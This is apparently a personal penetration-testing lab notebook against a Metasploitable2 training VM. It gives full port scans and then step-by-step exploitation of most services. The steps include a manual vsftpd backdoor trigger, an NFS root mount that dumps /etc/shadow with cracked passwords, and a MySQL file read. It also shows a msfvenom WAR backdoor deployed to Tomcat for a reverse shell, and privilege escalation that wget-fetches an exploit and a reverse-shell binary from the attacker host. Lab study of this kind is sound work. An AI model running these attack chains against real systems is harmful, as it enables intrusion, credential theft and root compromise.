root@kali:~/Desktop# bash ./detailPortScan.sh 10.0.0.15
working on 10.0.0.15...
will be a while so relax ^^

unicornscan 10.0.0.15:1-65535
TCP: 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,36924,42131,54688,58753

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-04 20:48 EDT
Nmap scan report for 10.0.0.15
Host is up (0.00047s latency).
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2017-04-05T00:51:08+00:00; -1s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      41994/udp  mountd
|   100005  1,2,3      58753/tcp  mountd
|   100021  1,3,4      42131/tcp  nlockmgr
|   100021  1,3,4      53419/udp  nlockmgr
|   100024  1          46899/udp  status
|_  100024  1          54688/tcp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login?
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    Java RMI Registry
1524/tcp  open  shell       Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, SupportsCompression, LongColumnFlag
|   Status: Autocommit
|_  Salt: u{+a(@K8uh(,DSS'fN4W\x00
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_ssl-date: 2017-04-05T00:51:09+00:00; -1s from scanner time.
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         Unreal ircd
| irc-info: 
|   users: 1.0
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 1:27:32
|   source ident: nmap
|   source host: 39AE3C33.D3975B40.7B559A54.IP
|_  error: Closing Link: xxrshswdq[10.0.0.14] (Quit: xxrshswdq)
6697/tcp  open  irc         Unreal ircd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36924/tcp open  unknown
42131/tcp open  nlockmgr    1-4 (RPC #100021)
54688/tcp open  status      1 (RPC #100024)
58753/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 08:00:27:BE:33:56 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP
|_  System time: 2017-04-04T20:51:09-04:00

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 10.0.0.15

Post-scan script results:
| clock-skew: 
|_  -1s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.18 seconds

unicornscan -mU 10.0.0.15:1-65535
UDP: 53,111,137,2049,58320

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-04 20:52 EDT
Nmap scan report for 10.0.0.15
Host is up (0.00038s latency).
PORT      STATE  SERVICE    VERSION
53/udp    open   domain     ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
|_dns-recursion: Recursion appears to be enabled
111/udp   open   rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      41994/udp  mountd
|   100005  1,2,3      58753/tcp  mountd
|   100021  1,3,4      42131/tcp  nlockmgr
|   100021  1,3,4      53419/udp  nlockmgr
|   100024  1          46899/udp  status
|_  100024  1          54688/tcp  status
137/udp   open   netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
2049/udp  open   nfs        2-4 (RPC #100003)
58320/udp closed unknown
MAC Address: 08:00:27:BE:33:56 (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: METASPLOITABLE

Host script results:
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 10.0.0.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.43 seconds

root@kali:~/Desktop# nmap 10.0.1.16 -p-

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-03-14 14:33 EDT
Nmap scan report for 10.0.1.16
Host is up (0.0011s latency).
Not shown: 65505 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp	--> vsftpd backdoor
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp	--> user enum using VRF
53/tcp    open  domain
80/tcp    open  http	--> will chack ^^
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry	--> exploit/multi/misc/java_rmi_server
1524/tcp  open  ingreslock	--> root backdoor
2049/tcp  open  nfs	--> mount root /
2121/tcp  open  ccproxy-ftp	--> proFtp 1.3.1
3306/tcp  open  mysql	--> mysql -h 10.0.1.16 -u root
3632/tcp  open  distccd	--> msf > use exploit/unix/misc/distcc_exec
5432/tcp  open  postgresql
5900/tcp  open  vnc	--> vncviwere 10.0.1.16:5900 password = password with root priv
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  unknown
8009/tcp  open  ajp13
8180/tcp  open  unknown	--> apache tomcat/priv exec
8787/tcp  open  unknown
35489/tcp open  unknown
42088/tcp open  unknown
42733/tcp open  unknown
45855/tcp open  unknown
MAC Address: 08:00:27:8E:D5:C0 (Oracle VirtualBox virtual NIC)

FTP port 21
anonymous login but no list or write
vsftpd backdoor
exploit/unix/ftp/vsftpd_234_backdoor
or manually with
root@kali:~/Desktop# nc -vn 10.0.1.16 21
(UNKNOWN) [10.0.1.16] 21 (ftp) open
220 (vsFTPd 2.3.4)
USER bla:)	--> usrname with :) will trigger backdoor port 6200 to open
331 Please specify the password.
PASS
^C
root@kali:~/Desktop# nc -vn 10.0.1.16 6200
(UNKNOWN) [10.0.1.16] 6200 (?) open
id
uid=0(root) gid=0(root)


HTTP port 80
root@kali:~/Desktop# whatweb http://10.0.1.16
http://10.0.1.16 [200 OK] Apache[2.2.8], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) DAV/2], IP[10.0.1.16], PHP[5.2.4-2ubuntu5.10], Title[Metasploitable2 - Linux], WebDAV[2], X-Powered-By[PHP/5.2.4-2ubuntu5.10]

Apache 2.28??
PHP 5.2.4??
DAV??

port 139/445
root@kali:~/Desktop# enum4linux 10.0.1.16
 =================================== 
|    OS information on 10.0.1.16    |
 =================================== 
[+] Got OS info for 10.0.1.16 from smbclient: Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
[+] Got OS info for 10.0.1.16 from srvinfo:
	METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)

[+] Attempting to map shares on 10.0.1.16
//10.0.1.16/print$	Mapping: DENIED, Listing: N/A
//10.0.1.16/tmp		Mapping: OK, Listing: OK	***write ok
//10.0.1.16/opt		Mapping: DENIED, Listing: N/A
//10.0.1.16/IPC$	[E] Can't understand response:
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian]
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//10.0.1.16/ADMIN$	Mapping: DENIED, Listing: N/A

and Lots of users info

port 2049 NFS
nfs misconfigure
aptitude install nfs-common
init 6
showmount -e 10.0.1.16
mkdir 10.0.1.16
mount 10.0.1.16:/ ./10.0.1.16

root@kali:~/Desktop# cat ./10.0.1.16/etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"

cat ./10.0.1.16/etc/shadow
service          (service)
user             (user)
postgres         (postgres)
msfadmin         (msfadmin)
123456789        (klog)
batman           (sys)

port 3306 mysql
mysql no root password
mysql -h 10.0.1.16 -u root
use mysql;
select load_file('/etc/passwd');

port 8180 Tomcat
tomcat default credentials (both admin and manager)
tomcat:tomcat
http://10.0.1.16:8180
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.1.15 LPORT=43 -f war > rev-443.war
upload/deploy the backdoor in manager
nc -lnvp 443
find the backdoor file name in war package
jar -tvf rev-443.war
curl http://10.0.1.16:8180/rev-443/<backdoor filename>.jsp
nc -lnvp 443
curl http://10.0.1.16:8180/rev-443/vfayjekzpbgdzof.jsp
python -c 'import pty;pty.spawn("/bin/bash")'

Priv esc

**on attacker
searchsploit 2.6 ubuntu | grep local
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) - UDEV < 141 Privilege Escala | ./linux/local/8572.c
gcc -m32 -Wl,--hash-style=both ./linux/local/8572.c /var/www/html/8572
msfvenom -p linux/x86/shell_reverse_tcp LPORT=444 LHOST=10.0.1.17 -f elf > /var/www/html/rev-444
nc -lnvp 444
**on target
cd /tmp
wget http://10.0.1.17/8572 -O ./8572
chmod +x ./8572
wget http://10.0.1.17/rev-444 -O ./run
chmod +x ./run
cat /proc/net/netlink	#grab pid or ps aux | grep udev --> pid -1
./8572 <pid - 1>
./8572 2400

root@kali:~/Desktop# nc -lnvp 444
listening on [any] 444 ...
connect to [10.0.1.17] from (UNKNOWN) [10.0.1.16] 45227
id
uid=0(root) gid=0(root)

port 3632 distcc (distribute C compiler)
msf > use exploit/unix/misc/distcc_exec
uid=1(daemon) gid=1(daemon) groups=1(daemon)

port 5900 TightVNC
vncviewer -geometry 800x600 -depth 16:1 10.0.1.16::5900
password:password 
desktop GUI with root
right click --> applicaiton --> shell --> bash


